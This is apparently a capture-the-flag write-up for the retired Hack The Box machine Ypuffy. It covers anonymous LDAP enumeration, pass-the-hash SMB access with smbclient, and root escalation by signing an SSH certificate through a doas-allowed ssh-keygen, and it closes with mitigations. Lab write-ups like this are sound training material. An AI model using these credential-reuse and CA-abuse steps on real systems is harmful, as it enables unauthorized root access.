---
machine: Ypuffy
os: OpenBSD
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [openbsd, ldap, samba, ssh-ca, doas]
---

# Ypuffy — Hack The Box (OpenBSD)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

LDAP allows anonymous bind and exposes `alice1978` Samba hash. Pass-the-hash accesses their SMB share and downloads a PuTTY key. `alice1978` may run `ssh-keygen` as `userca` through `doas`; the `userca` CA signs a key with the root principal and provides SSH as root.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
22/tcp   ssh     OpenSSH 7.7
80/tcp   http    OpenBSD httpd
139/tcp  netbios-ssn Samba
389/tcp  ldap    Anonymous bind OK
445/tcp  microsoft-ds Samba 4.7.6
```

## Enumeration

- `ldapsearch -x -b dc=hackthebox,dc=htb` returns users and Samba attributes.
- `alice1978` has `sambaNTPassword`; `bob8791` appears as a second account.
- The `alice` share contains `my_private_key.ppk`.
- The website only exposes `/userca` and `/sshauth`; everything else is blocked.

## Foothold

The NTLM hash is used with `smbclient` or `impacket` to authenticate as `alice1978` without the password. The `.ppk` key is downloaded from the share and converted to OpenSSH format with `puttygen`.

```bash
smbclient //<IP>/alice -U alice1978 --pw-nt-hash <NTLM_HASH>
puttygen my_private_key.ppk -O private-openssh -o alice.key
ssh -i alice.key alice1978@<IP>
```

## Lateral movement

`/etc/doas.conf` lets `alice1978` run `/usr/bin/ssh-keygen` as `userca` without a password. `/home/userca` holds `ca` and `ca.pub`, the CA that signs keys accepted by `sshd`.

`sshd_config` uses `TrustedUserCAKeys` and `AuthorizedPrincipalsCommand`; a certificate with the right principal is accepted as root.

## Privilege escalation

A key pair is generated, its public key is signed by the `userca` CA and the root principal is set. The resulting certificate is presented to `sshd`.

```bash
doas -u userca ssh-keygen -s /home/userca/ca -I <ID> -n root -V +1d alice.key.pub
ssh -i alice.key root@<IP>
```

## Evidence

- Trimmed output from key commands; no flags, credentials or tokens.
- Real values, when present, live in `private/` and are not published.

## Lessons learned

- Anonymous LDAP can leak Samba hashes.
- Pass-the-hash avoids the need to crack.
- An SSH CA reachable through `doas` is root-equivalent if it accepts any principal.
- Short-lived certificates do not compensate for a poorly protected CA.

## Mitigations and detection

- Require LDAP authentication and limit readable attributes.
- Disable NTLM and use Kerberos or modern credentials.
- Restrict `ssh-keygen` by principal and command; protect the CA.
- Audit `TrustedUserCAKeys` and allowed principals.

## References

- [0xdf — Ypuffy](https://0xdf.gitlab.io/2019/02/09/htb-ypuffy.html)
- [AnubisSec — Ypuffy](https://anubissec.github.io/Ypuffy-Hackthebox-WriteUp/)
- [Video search (CSV)](https://www.youtube.com/results?search_query=ippsec+ypuffy)
